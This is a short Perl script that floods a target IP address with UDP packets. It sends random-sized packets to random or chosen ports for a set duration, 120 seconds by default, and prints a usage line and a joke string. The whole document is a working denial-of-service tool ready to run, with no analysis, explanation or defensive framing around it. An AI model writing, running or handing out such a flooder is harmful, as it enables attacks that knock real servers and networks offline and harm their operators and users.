
use Socket;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Usage: perl ditme.pl <Target>\n";
$endtime = time() + ($time ? $time : 120);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Target:$ip Time:120 \n";
print "skibidi\n";

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","01010101"), 0, pack_sockaddr_in($pport, $iaddr));}